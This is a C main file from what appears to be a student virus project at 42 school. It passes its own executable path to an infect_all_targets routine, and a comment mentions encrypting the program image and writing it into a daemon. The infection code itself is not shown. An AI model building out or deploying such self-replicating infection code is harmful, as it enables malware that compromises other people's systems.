/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 19:17:25 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 20:02:56 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

/*
**      --> DEAMON (hexdump of his execution image will he ctypted, decripted and writed into a deamon)
*/
int main(int ac, char **argv)
{
    (void)ac;
    (void)infect_all_targets((const char *)argv[0]);
    return (0);
}